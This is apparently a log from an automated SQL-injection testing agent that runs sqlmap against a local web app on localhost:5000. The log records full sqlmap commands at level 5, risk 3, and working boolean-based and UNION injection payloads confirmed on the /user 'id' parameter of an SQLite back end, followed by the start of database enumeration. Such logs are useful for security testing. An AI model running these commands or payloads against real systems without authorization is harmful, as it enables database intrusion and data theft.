2025-09-26 18:49:46,986 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/login --data 'username=test&password=test'
2025-09-26 18:49:54,996 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/login --data 'username=test&password=test'
2025-09-26 18:50:02,614 - INFO -         ___
2025-09-26 18:50:02,614 - INFO -        __H__
2025-09-26 18:50:02,614 - INFO -  ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:50:02,614 - INFO - |_ -| . [']     | .'| . |
2025-09-26 18:50:02,614 - INFO - |___|_  ["]_|_|_|__,|  _|
2025-09-26 18:50:02,614 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:50:02,614 - INFO - 
2025-09-26 18:50:02,646 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:50:02,646 - INFO - 
2025-09-26 18:50:02,646 - INFO - [*] starting @ 18:50:02 /2025-09-26/
2025-09-26 18:50:02,646 - INFO - 
2025-09-26 18:50:11,548 - INFO - [18:50:11] [INFO] flushing session file
2025-09-26 18:50:11,557 - INFO - [18:50:11] [INFO] testing connection to the target URL
2025-09-26 18:50:12,272 - INFO - [18:50:12] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
2025-09-26 18:50:12,272 - INFO - [18:50:12] [WARNING] HTTP error codes detected during run:
2025-09-26 18:50:12,272 - INFO - 401 (Unauthorized) - 1 times
2025-09-26 18:50:12,272 - INFO - 
2025-09-26 18:50:12,282 - INFO - [*] ending @ 18:50:12 /2025-09-26/
2025-09-26 18:50:12,282 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/login --data 'username=test&password=test'
--------------------------------------------------
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:50:02 /2025-09-26/

[18:50:11] [INFO] flushing session file
[18:50:11] [INFO] testing connection to the target URL
[18:50:12] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
[18:50:12] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times

[*] ending @ 18:50:12 /2025-09-26/

2025-09-26 18:50:12,443 - INFO - Flushed sqlmap session for http://localhost:5000/login (log: attack-logs-dynamic\User_Login_flush.log)
2025-09-26 18:50:12,444 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/login --output-dir 'attack-logs-dynamic\User_Login_sqlmap' --batch --level=5 --risk=3 --threads 5 --data 'username=test&password=test' --technique BU
2025-09-26 18:50:15,717 - INFO -         ___
2025-09-26 18:50:15,717 - INFO -        __H__
2025-09-26 18:50:15,717 - INFO -  ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:50:15,717 - INFO - |_ -| . [,]     | .'| . |
2025-09-26 18:50:15,717 - INFO - |___|_  [.]_|_|_|__,|  _|
2025-09-26 18:50:15,717 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:50:15,717 - INFO - 
2025-09-26 18:50:15,748 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:50:15,748 - INFO - 
2025-09-26 18:50:15,748 - INFO - [*] starting @ 18:50:15 /2025-09-26/
2025-09-26 18:50:15,748 - INFO - 
2025-09-26 18:50:17,562 - INFO - [18:50:17] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\User_Login_sqlmap' as the output directory
2025-09-26 18:50:18,154 - INFO - [18:50:18] [INFO] testing connection to the target URL
2025-09-26 18:50:18,169 - INFO - [18:50:18] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
2025-09-26 18:50:18,169 - INFO - [18:50:18] [WARNING] HTTP error codes detected during run:
2025-09-26 18:50:18,169 - INFO - 401 (Unauthorized) - 1 times
2025-09-26 18:50:18,171 - INFO - 
2025-09-26 18:50:18,171 - INFO - [*] ending @ 18:50:18 /2025-09-26/
2025-09-26 18:50:18,171 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/login --output-dir 'attack-logs-dynamic\User_Login_sqlmap' --batch --level=5 --risk=3 --threads 5 --data 'username=test&password=test' --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:50:15 /2025-09-26/

[18:50:17] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\User_Login_sqlmap' as the output directory
[18:50:18] [INFO] testing connection to the target URL
[18:50:18] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
[18:50:18] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times

[*] ending @ 18:50:18 /2025-09-26/

2025-09-26 18:50:18,177 - INFO - No clear injection detected during discovery for http://localhost:5000/login
2025-09-26 18:50:18,177 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/user
2025-09-26 18:50:21,428 - INFO -         ___
2025-09-26 18:50:21,429 - INFO -        __H__
2025-09-26 18:50:21,429 - INFO -  ___ ___["]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:50:21,429 - INFO - |_ -| . [']     | .'| . |
2025-09-26 18:50:21,429 - INFO - |___|_  ["]_|_|_|__,|  _|
2025-09-26 18:50:21,430 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:50:21,430 - INFO - 
2025-09-26 18:50:21,452 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:50:21,452 - INFO - 
2025-09-26 18:50:21,452 - INFO - [*] starting @ 18:50:21 /2025-09-26/
2025-09-26 18:50:21,452 - INFO - 
2025-09-26 18:50:23,761 - INFO - [18:50:23] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:50:23,761 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:50:23,781 - INFO - [18:50:23] [INFO] testing connection to the target URL
2025-09-26 18:50:23,887 - INFO - [18:50:23] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 18:50:23,887 - INFO - [18:50:23] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:50:23,905 - INFO - [18:50:23] [INFO] testing if the target URL content is stable
2025-09-26 18:50:24,297 - INFO - [18:50:24] [INFO] target URL content is stable
2025-09-26 18:50:24,298 - INFO - [18:50:24] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 18:50:24,331 - INFO - [18:50:24] [INFO] URI parameter '#1*' appears to be dynamic
2025-09-26 18:50:24,354 - INFO - [18:50:24] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 18:50:24,379 - INFO - [18:50:24] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 18:50:24,434 - INFO - [18:50:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:50:24,543 - INFO - [18:50:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:50:24,580 - INFO - [18:50:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:50:24,624 - INFO - [18:50:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 18:50:24,673 - INFO - [18:50:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 18:50:24,719 - INFO - [18:50:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 18:50:24,767 - INFO - [18:50:24] [INFO] testing 'Generic inline queries'
2025-09-26 18:50:24,780 - INFO - [18:50:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 18:50:24,808 - INFO - [18:50:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 18:50:24,843 - INFO - [18:50:24] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 18:50:24,894 - INFO - [18:50:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 18:50:24,928 - INFO - [18:50:24] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 18:50:24,976 - INFO - [18:50:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 18:50:25,016 - INFO - [18:50:25] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 18:50:25,060 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:50:25,060 - INFO - [18:50:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:50:25,103 - INFO - [18:50:25] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 18:50:25,103 - INFO - [18:50:25] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:50:25,103 - INFO - [18:50:25] [WARNING] HTTP error codes detected during run:
2025-09-26 18:50:25,113 - INFO - 500 (Internal Server Error) - 3 times, 404 (Not Found) - 73 times
2025-09-26 18:50:25,113 - INFO - 
2025-09-26 18:50:25,113 - INFO - [*] ending @ 18:50:25 /2025-09-26/
2025-09-26 18:50:25,113 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/user
--------------------------------------------------
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:50:21 /2025-09-26/

[18:50:23] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:50:23] [INFO] testing connection to the target URL
[18:50:23] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[18:50:23] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:50:23] [INFO] testing if the target URL content is stable
[18:50:24] [INFO] target URL content is stable
[18:50:24] [INFO] testing if URI parameter '#1*' is dynamic
[18:50:24] [INFO] URI parameter '#1*' appears to be dynamic
[18:50:24] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:50:24] [INFO] testing for SQL injection on URI parameter '#1*'
[18:50:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:50:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:50:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:50:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:50:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:50:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:50:24] [INFO] testing 'Generic inline queries'
[18:50:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:50:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:50:24] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:50:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:50:24] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:50:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:50:25] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:50:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:50:25] [WARNING] URI parameter '#1*' does not seem to be injectable
[18:50:25] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:50:25] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 3 times, 404 (Not Found) - 73 times

[*] ending @ 18:50:25 /2025-09-26/

2025-09-26 18:50:25,249 - INFO - Flushed sqlmap session for http://localhost:5000/user (log: attack-logs-dynamic\Get_User_by_ID_flush.log)
2025-09-26 18:50:25,249 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/user?id=test' --output-dir 'attack-logs-dynamic\Get_User_by_ID_sqlmap' --batch --level=5 --risk=3 --threads 5 -p id --technique BU
2025-09-26 18:50:28,516 - INFO -         ___
2025-09-26 18:50:28,516 - INFO -        __H__
2025-09-26 18:50:28,516 - INFO -  ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:50:28,516 - INFO - |_ -| . [,]     | .'| . |
2025-09-26 18:50:28,516 - INFO - |___|_  [.]_|_|_|__,|  _|
2025-09-26 18:50:28,516 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:50:28,516 - INFO - 
2025-09-26 18:50:28,547 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:50:28,547 - INFO - 
2025-09-26 18:50:28,547 - INFO - [*] starting @ 18:50:28 /2025-09-26/
2025-09-26 18:50:28,547 - INFO - 
2025-09-26 18:50:30,327 - INFO - [18:50:30] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID_sqlmap' as the output directory
2025-09-26 18:50:30,973 - INFO - [18:50:30] [INFO] testing connection to the target URL
2025-09-26 18:50:31,059 - INFO - [18:50:31] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 18:50:31,059 - INFO - [18:50:31] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:50:31,098 - INFO - [18:50:31] [INFO] testing if the target URL content is stable
2025-09-26 18:50:31,485 - INFO - [18:50:31] [INFO] target URL content is stable
2025-09-26 18:50:31,612 - INFO - [18:50:31] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
2025-09-26 18:50:31,629 - INFO - [18:50:31] [INFO] testing for SQL injection on GET parameter 'id'
2025-09-26 18:50:31,695 - INFO - [18:50:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:50:31,708 - INFO - [18:50:31] [WARNING] reflective value(s) found and filtering out
2025-09-26 18:50:32,841 - INFO - [18:50:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:50:33,771 - INFO - [18:50:33] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
2025-09-26 18:50:34,075 - INFO - [18:50:34] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite'
2025-09-26 18:50:34,075 - INFO - it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
2025-09-26 18:50:34,111 - INFO - [18:50:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
2025-09-26 18:50:34,113 - INFO - [18:50:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
2025-09-26 18:50:34,295 - INFO - [18:50:34] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
2025-09-26 18:50:34,321 - INFO - [18:50:34] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
2025-09-26 18:50:34,360 - INFO - [18:50:34] [INFO] target URL appears to have 3 columns in query
2025-09-26 18:50:34,456 - INFO - [18:50:34] [INFO] GET parameter 'id' is 'Generic UNION query (random number) - 1 to 20 columns' injectable
2025-09-26 18:50:34,466 - INFO - [18:50:34] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
2025-09-26 18:50:34,466 - INFO - [18:50:34] [WARNING] applying generic concatenation (CONCAT)
2025-09-26 18:50:34,493 - INFO - GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
2025-09-26 18:50:34,571 - INFO - sqlmap identified the following injection point(s) with a total of 255 HTTP(s) requests:
2025-09-26 18:50:34,571 - INFO - ---
2025-09-26 18:50:34,581 - INFO - Parameter: id (GET)
2025-09-26 18:50:34,581 - INFO -     Type: boolean-based blind
2025-09-26 18:50:34,581 - INFO -     Title: OR boolean-based blind - WHERE or HAVING clause
2025-09-26 18:50:34,581 - INFO -     Payload: id=-3862 OR 5105=5105
2025-09-26 18:50:34,581 - INFO - 
2025-09-26 18:50:34,581 - INFO -     Type: UNION query
2025-09-26 18:50:34,581 - INFO -     Title: Generic UNION query (random number) - 3 columns
2025-09-26 18:50:34,581 - INFO -     Payload: id=-8835 UNION ALL SELECT 4128,CHAR(113,113,118,118,113)||CHAR(74,120,65,87,71,113,70,101,74,70,117,65,83,73,65,73,113,88,68,98,67,98,90,113,65,80,122,77,68,65,119,121,83,115,106,66,107,67,104,77)||CHAR(113,107,112,120,113),4128-- WSzk
2025-09-26 18:50:34,581 - INFO - ---
2025-09-26 18:50:34,581 - INFO - [18:50:34] [INFO] testing SQLite
2025-09-26 18:50:34,602 - INFO - [18:50:34] [INFO] confirming SQLite
2025-09-26 18:50:34,615 - INFO - [18:50:34] [INFO] actively fingerprinting SQLite
2025-09-26 18:50:34,633 - INFO - [18:50:34] [INFO] the back-end DBMS is SQLite
2025-09-26 18:50:34,633 - INFO - back-end DBMS: SQLite
2025-09-26 18:50:34,633 - INFO - [18:50:34] [WARNING] HTTP error codes detected during run:
2025-09-26 18:50:34,633 - INFO - 500 (Internal Server Error) - 250 times, 404 (Not Found) - 6 times
2025-09-26 18:50:34,633 - INFO - [18:50:34] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID_sqlmap\localhost'
2025-09-26 18:50:34,633 - INFO - 
2025-09-26 18:50:34,633 - INFO - [*] ending @ 18:50:34 /2025-09-26/
2025-09-26 18:50:34,633 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/user?id=test' --output-dir 'attack-logs-dynamic\Get_User_by_ID_sqlmap' --batch --level=5 --risk=3 --threads 5 -p id --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:50:28 /2025-09-26/

[18:50:30] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID_sqlmap' as the output directory
[18:50:30] [INFO] testing connection to the target URL
[18:50:31] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[18:50:31] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:50:31] [INFO] testing if the target URL content is stable
[18:50:31] [INFO] target URL content is stable
[18:50:31] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[18:50:31] [INFO] testing for SQL injection on GET parameter 'id'
[18:50:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:50:31] [WARNING] reflective value(s) found and filtering out
[18:50:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:50:33] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[18:50:34] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[18:50:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:50:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:50:34] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[18:50:34] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:50:34] [INFO] target URL appears to have 3 columns in query
[18:50:34] [INFO] GET parameter 'id' is 'Generic UNION query (random number) - 1 to 20 columns' injectable
[18:50:34] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[18:50:34] [WARNING] applying generic concatenation (CONCAT)
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 255 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: id=-3862 OR 5105=5105

    Type: UNION query
    Title: Generic UNION query (random number) - 3 columns
    Payload: id=-8835 UNION ALL SELECT 4128,CHAR(113,113,118,118,113)||CHAR(74,120,65,87,71,113,70,101,74,70,117,65,83,73,65,73,113,88,68,98,67,98,90,113,65,80,122,77,68,65,119,121,83,115,106,66,107,67,104,77)||CHAR(113,107,112,120,113),4128-- WSzk
---
[18:50:34] [INFO] testing SQLite
[18:50:34] [INFO] confirming SQLite
[18:50:34] [INFO] actively fingerprinting SQLite
[18:50:34] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[18:50:34] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 250 times, 404 (Not Found) - 6 times
[18:50:34] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID_sqlmap\localhost'

[*] ending @ 18:50:34 /2025-09-26/

2025-09-26 18:50:34,830 - WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Get_User_by_ID_discovery.log
2025-09-26 18:50:34,846 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/user?id=test' --output-dir 'attack-logs-dynamic\Get_User_by_ID_sqlmap' --batch --level=5 --risk=3 --threads 5 -p id --dbs
2025-09-26 18:50:38,217 - INFO -         ___
2025-09-26 18:50:38,217 - INFO -        __H__
2025-09-26 18:50:38,217 - INFO -  ___ ___[']_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:50:38,217 - INFO - |_ -| . ["]     | .'| . |
2025-09-26 18:50:38,226 - INFO - |___|_  ["]_|_|_|__,|  _|
2025-09-26 18:50:38,226 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:50:38,226 - INFO - 
2025-09-26 18:50:38,241 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:50:38,241 - INFO - 
2025-09-26 18:50:38,241 - INFO - [*] starting @ 18:50:38 /2025-09-26/
2025-09-26 18:50:38,241 - INFO - 
2025-09-26 18:50:40,139 - INFO - [18:50:40] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID_sqlmap' as the output directory
2025-09-26 18:50:40,690 - INFO - [18:50:40] [INFO] resuming back-end DBMS 'sqlite'
2025-09-26 18:50:40,701 - INFO - [18:50:40] [INFO] testing connection to the target URL
2025-09-26 18:50:40,764 - INFO - [18:50:40] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 18:50:40,764 - INFO - sqlmap resumed the following injection point(s) from stored session:
2025-09-26 18:50:40,764 - INFO - ---
2025-09-26 18:50:40,764 - INFO - Parameter: id (GET)
2025-09-26 18:50:40,774 - INFO -     Type: boolean-based blind
2025-09-26 18:50:40,774 - INFO -     Title: OR boolean-based blind - WHERE or HAVING clause
2025-09-26 18:50:40,774 - INFO -     Payload: id=-3862 OR 5105=5105
2025-09-26 18:50:40,774 - INFO - 
2025-09-26 18:50:40,774 - INFO -     Type: UNION query
2025-09-26 18:50:40,774 - INFO -     Title: Generic UNION query (random number) - 3 columns
2025-09-26 18:50:40,774 - INFO -     Payload: id=-8835 UNION ALL SELECT 4128,CHAR(113,113,118,118,113)||CHAR(74,120,65,87,71,113,70,101,74,70,117,65,83,73,65,73,113,88,68,98,67,98,90,113,65,80,122,77,68,65,119,121,83,115,106,66,107,67,104,77)||CHAR(113,107,112,120,113),4128-- WSzk
2025-09-26 18:50:40,774 - INFO - ---
2025-09-26 18:50:40,779 - INFO - [18:50:40] [INFO] the back-end DBMS is SQLite
2025-09-26 18:50:40,779 - INFO - back-end DBMS: SQLite
2025-09-26 18:50:40,779 - INFO - [18:50:40] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
2025-09-26 18:50:40,779 - INFO - [18:50:40] [WARNING] HTTP error codes detected during run:
2025-09-26 18:50:40,779 - INFO - 500 (Internal Server Error) - 1 times
2025-09-26 18:50:40,779 - INFO - [18:50:40] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID_sqlmap\localhost'
2025-09-26 18:50:40,779 - INFO - 
2025-09-26 18:50:40,779 - INFO - [*] ending @ 18:50:40 /2025-09-26/
2025-09-26 18:50:40,779 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/user?id=test' --output-dir 'attack-logs-dynamic\Get_User_by_ID_sqlmap' --batch --level=5 --risk=3 --threads 5 -p id --dbs
--------------------------------------------------
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9.4#dev}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:50:38 /2025-09-26/

[18:50:40] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID_sqlmap' as the output directory
[18:50:40] [INFO] resuming back-end DBMS 'sqlite' 
[18:50:40] [INFO] testing connection to the target URL
